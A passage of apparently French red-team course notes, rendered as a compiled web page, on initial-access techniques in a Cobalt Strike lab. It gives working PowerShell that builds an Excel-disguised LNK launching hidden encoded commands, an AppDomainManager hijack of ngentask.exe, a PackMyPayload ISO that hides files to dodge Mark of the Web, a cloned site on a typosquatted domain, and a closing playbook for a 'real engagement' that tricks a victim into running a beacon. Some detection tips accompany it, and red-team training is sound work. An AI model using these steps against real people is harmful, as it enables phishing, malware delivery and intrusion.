+<span class="line"><span>10  Otcom        54%       36987-2281</span></span></code></pre></div></li><li><p>Enregistrer le classeur de démonstration sous <code>C:\\Payloads\\deals\\deals.xlsx</code>, puis fermer Excel.</p></li></ol><img src="`+c+`" width="860"><hr><h2 id="raccourci-lnk-—-comprendre-le-declencheur" tabindex="-1">Raccourci LNK — Comprendre le déclencheur <a class="header-anchor" href="#raccourci-lnk-—-comprendre-le-declencheur" aria-label="Permalink to &quot;Raccourci LNK — Comprendre le déclencheur&quot;">​</a></h2><p><strong>Principe :</strong> un fichier <code>.lnk</code> est un raccourci Windows et non un document Office. Le nom et l’icône affichés peuvent différer de la véritable action exécutée.</p><p>Le lab montre un raccourci associé à un fichier Excel, avec une chaîne de processus comprenant <code>Explorer.exe</code>, <code>cmd.exe</code>, <code>powershell.exe</code> et <code>ngentask.exe</code>. Dans le scénario, le raccourci ouvre le document de démonstration et déclenche également d’autres opérations.</p><p><strong>Points de détection :</strong></p><ul><li>Une commande PowerShell encodée avec <code>-enc</code> peut être un signal d’alerte.</li><li>La présence de <code>powershell.exe</code> et <code>ngentask.exe</code> dans la même chaîne parent-enfant mérite d’être examinée.</li><li>L’icône d’un fichier n’est pas une preuve de son type réel.</li></ul><p>Le bloc suivant est la commande PowerShell d’exemple reproduite depuis le lab.</p><pre><code>\`\`\`PowerShell-linenums
+cd C:\\Payloads\\deals\\
+$cmd = &#39;$env:APPDOMAIN_MANAGER_TYPE = &quot;AppDomainHijack.DomainManager&quot;; $env:APPDOMAIN_MANAGER_ASM = &quot;AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot;; .\\ngentask.exe&#39;
+$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
+\`\`\`
+</code></pre><blockquote><p><strong>Lecture du code :</strong> la variable <code>$cmd</code> contient une commande, puis <code>$enc</code> stocke sa représentation en Base64. Pour l’option PowerShell <code>-enc</code>, le contenu est encodé selon le format UTF-16LE.</p><p>Un encodage Base64 ne constitue pas une mesure de chiffrement. Le contenu peut être décodé et analysé.</p></blockquote><h3 id="examiner-les-proprietes-du-raccourci" tabindex="-1">Examiner les propriétés du raccourci <a class="header-anchor" href="#examiner-les-proprietes-du-raccourci" aria-label="Permalink to &quot;Examiner les propriétés du raccourci&quot;">​</a></h3><p>Le bloc suivant illustre la structure d’un raccourci Windows construit avec l’interface COM <code>WScript.Shell</code>.</p><pre><code>\`\`\`PowerShell-linenums
+$wsh = New-Object -ComObject WScript.Shell
+$lnk = $wsh.CreateShortcut(&quot;C:\\Payloads\\deals\\deals.xlsx.lnk&quot;)
+$lnk.TargetPath = &quot;%COMSPEC%&quot;
+$lnk.Arguments = &quot;/C start deals.xlsx &amp;&amp; %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -enc $enc&quot;
+$lnk.IconLocation = &quot;%ProgramFiles%\\Microsoft Office\\root\\Office16\\EXCEL.EXE,0&quot;
+$lnk.Save()
+\`\`\`
+</code></pre><blockquote><p><strong>Propriétés du fichier LNK :</strong></p><ul><li><code>TargetPath</code> définit le programme cible du raccourci.</li><li><code>Arguments</code> contient les paramètres transmis au programme.</li><li><code>IconLocation</code> indique l’icône affichée dans Explorer.</li></ul><p>Pour le contrôle de sécurité, ces champs doivent être analysés conjointement. Une icône Excel peut représenter un raccourci exécutant un autre programme.</p></blockquote><img src="`+d+'" width="1024"><h3 id="verification-dans-l-environnement-de-formation" tabindex="-1">Vérification dans l’environnement de formation <a class="header-anchor" href="#verification-dans-l-environnement-de-formation" aria-label="Permalink to &quot;Vérification dans l’environnement de formation&quot;">​</a></h3><p>Le cours présente le fichier <code>deals.xlsx.lnk</code> et le classeur de démonstration. La validation du lab repose sur l’observation du document et de la nouvelle session Cobalt Strike.</p><img src="'+p+'" width="1024"><hr><h2 id="conteneur-iso-—-etudier-mark-of-the-web" tabindex="-1">Conteneur ISO — Étudier Mark of the Web <a class="header-anchor" href="#conteneur-iso-—-etudier-mark-of-the-web" aria-label="Permalink to &quot;Conteneur ISO — Étudier Mark of the Web&quot;">​</a></h2><p><strong>Mark of the Web (MotW)</strong> repose notamment sur la zone de provenance associée aux fichiers Windows, par exemple le flux <code>Zone.Identifier</code> sur NTFS. Ce marquage peut influencer les avertissements SmartScreen et le comportement de Protected View dans Office.</p><p>Le lab compare le comportement des fichiers récupérés directement et de ceux contenus dans une image ISO. La propagation de MotW dépend aussi de la version de Windows, des correctifs et du mécanisme d’extraction ; il ne faut pas considérer son absence comme garantie.</p><p>Le paramètre <code>-H</code> de l’outil PackMyPayload est présenté dans les notes comme un mécanisme de gestion de la visibilité des fichiers dans l’image de l’exercice.</p><h3 id="examiner-l-archive-du-lab" tabindex="-1">Examiner l’archive du lab <a class="header-anchor" href="#examiner-l-archive-du-lab" aria-label="Permalink to &quot;Examiner l’archive du lab&quot;">​</a></h3><p>Le bloc suivant indique la commande PackMyPayload utilisée par le cours pour produire le fichier <code>deals.iso</code>.</p><pre><code>```ubuntu-nocolor\npython3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,ngentask.exe,AppDomainHijack.dll /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso\n```\n</code></pre><blockquote><p><strong>Éléments de la commande :</strong></p><ul><li><code>PackMyPayload.py</code> est l’outil de création d’images ou d’archives.</li><li>L’option <code>-H</code> prend une liste de fichiers dans le scénario.</li><li><code>/mnt/c/Payloads/deals/</code> correspond au répertoire source.</li><li><code>/mnt/c/Payloads/deals/deals.iso</code> désigne le fichier de sortie.</li></ul><p>Lors de l’analyse d’une archive provenant d’une source non fiable, il faut examiner les raccourcis, les fichiers intégrés et les mécanismes d’exécution qu’elle contient.</p></blockquote><h3 id="verifier-le-contenu-de-l-iso-dans-le-lab" tabindex="-1">Vérifier le contenu de l’ISO dans le lab <a class="header-anchor" href="#verifier-le-contenu-de-l-iso-dans-le-lab" aria-label="Permalink to &quot;Vérifier le contenu de l’ISO dans le lab&quot;">​</a></h3><p>Les supports présentent le montage de <code>deals.iso</code> et l’observation des éléments visibles dans Explorer.</p><img src="'+u+'" width="1024"><hr><h2 id="livraison-web-—-comprendre-le-scenario" tabindex="-1">Livraison web — Comprendre le scénario <a class="header-anchor" href="#livraison-web-—-comprendre-le-scenario" aria-label="Permalink to &quot;Livraison web — Comprendre le scénario&quot;">​</a></h2><p>Cette section illustre un dispositif de <strong>distribution de fichier</strong> et de <strong>clonage de page</strong> dans l’environnement d’exercice Cobalt Strike. Elle vise à comprendre les risques associés aux pages de téléchargement imitant un site réel.</p><p>Deux fonctions de Site Management sont présentées :</p><ol><li><strong>Host File</strong> : met un fichier à disposition sous une URI.</li><li><strong>Clone Site</strong> : crée une copie locale d’une page web pour l’environnement d’entraînement.</li></ol><p>Le lab utilise notamment les valeurs <code>/deals.iso</code>, <code>/deals</code>, <code>deals.bleepingcomputer.com</code> et <code>www.bleepincomputer.com</code>. Ces chaînes appartiennent à son exemple et ne prouvent pas qu’une page est légitime.</p><p><strong>Signaux à vérifier :</strong> incohérences de domaine, protocole HTTP/S, comportement de téléchargement, en-têtes <code>Host</code> et scripts exécutés depuis une page. Le clonage d’un site peut être incomplet, notamment pour certains fichiers JavaScript et CSS.</p><h3 id="hebergement-presente-dans-cobalt-strike" tabindex="-1">Hébergement présenté dans Cobalt Strike <a class="header-anchor" href="#hebergement-presente-dans-cobalt-strike" aria-label="Permalink to &quot;Hébergement présenté dans Cobalt Strike&quot;">​</a></h3><p>Les notes illustrent <strong>Site Management &gt; Host File</strong>, puis la fonction <strong>Clone Site</strong>. Les valeurs et chemins de l’exercice restent les suivants :</p><ul><li>Fichier : <code>C:\\Payloads\\deals\\deals.iso</code></li><li>URI du fichier : <code>/deals.iso</code></li><li>URI de la page : <code>/deals</code></li><li>Nom d’hôte du lab : <code>www.bleepincomputer.com</code></li><li>Page de référence : <code>https://deals.bleepingcomputer.com</code></li></ul><img src="'+m+`" width="1024"><h3 id="observer-le-resultat-dans-le-lab" tabindex="-1">Observer le résultat dans le lab <a class="header-anchor" href="#observer-le-resultat-dans-le-lab" aria-label="Permalink to &quot;Observer le résultat dans le lab&quot;">​</a></h3><p>Le scénario final présente les étapes d’accès à la page de démonstration, le fichier téléchargé, son ouverture, puis le résultat visible dans la console Cobalt Strike. Il rappelle la différence entre l’apparence d’un document et la chaîne de programmes réellement lancés.</p><p><strong>Bilan :</strong> AppDomainManager, fichiers LNK, MotW, ISO et clonage web constituent des sujets d’analyse distincts. L’étape de phishing reste <strong>hors du parcours Assume Breach</strong>.</p><hr><h2 id="recapitulatif-de-l-examen-—-scenario-assume-breach" tabindex="-1">Récapitulatif de l’examen — Scénario Assume Breach <a class="header-anchor" href="#recapitulatif-de-l-examen-—-scenario-assume-breach" aria-label="Permalink to &quot;Récapitulatif de l’examen — Scénario Assume Breach&quot;">​</a></h2><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>EXAM (assume-breach — direct workstation access):</span></span>
+<span class="line"><span>─────────────────────────────────────────────────</span></span>
+<span class="line"><span>On attacker Windows dev box:</span></span>
+<span class="line"><span>  1. Generate raw shellcode → CS → Payloads → Windows Stageless Payload → Raw → http_x64.xprocess.bin</span></span>
+<span class="line"><span>  2. Build AppDomainHijack.dll in VS (Release, .NET Framework)</span></span>
+<span class="line"><span>  3. C:\\Tools\\ThreatCheck\\ThreatCheck\\bin\\Debug\\ThreatCheck.exe -f AppDomainHijack.dll  → must be clean</span></span>
+<span class="line"><span>  4. Copy AppDomainHijack.dll to delivery location (CS web server or USB/share)</span></span>
+<span class="line"><span>  5. Copy ngentask.exe from WinSxS to same location</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>On exam foothold workstation (logged in with provided creds):</span></span>
+<span class="line"><span>  6. Copy AppDomainHijack.dll and ngentask.exe to a working directory (e.g. C:\\Windows\\Temp\\)</span></span>
+<span class="line"><span>  7. Open PowerShell</span></span>
+<span class="line"><span>  8. cd to the directory containing both files</span></span>
+<span class="line"><span>  9. $env:APPDOMAIN_MANAGER_TYPE = &#39;AppDomainHijack.DomainManager&#39;</span></span>
+<span class="line"><span>     $env:APPDOMAIN_MANAGER_ASM = &#39;AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&#39;</span></span>
+<span class="line"><span>  10. .\\ngentask.exe</span></span>
+<span class="line"><span>  11. Beacon checks in from msedge.exe → confirm getuid, ps</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>REAL ENGAGEMENT (phishing — no direct access):</span></span>
+<span class="line"><span>───────────────────────────────────────────────</span></span>
+<span class="line"><span>Steps 1–5 above PLUS:</span></span>
+<span class="line"><span>  6. Create decoy (deals.xlsx)</span></span>
+<span class="line"><span>  7. Build LNK trigger (deals.xlsx.lnk with cmd→powershell→ngentask chain)</span></span>
+<span class="line"><span>  8. PackMyPayload → ISO (hide DLL, ngentask, xlsx — show only LNK)</span></span>
+<span class="line"><span>  9. CS Site Management → Host ISO → Clone legitimate site with ISO as attack payload</span></span>
+<span class="line"><span>  10. Social engineer victim to visit URL → ISO downloads → victim mounts + clicks LNK → beacon</span></span></code></pre></div>`,130)]))}const f=n(h,[["render",b]]);export{A as __pageData,f as default};
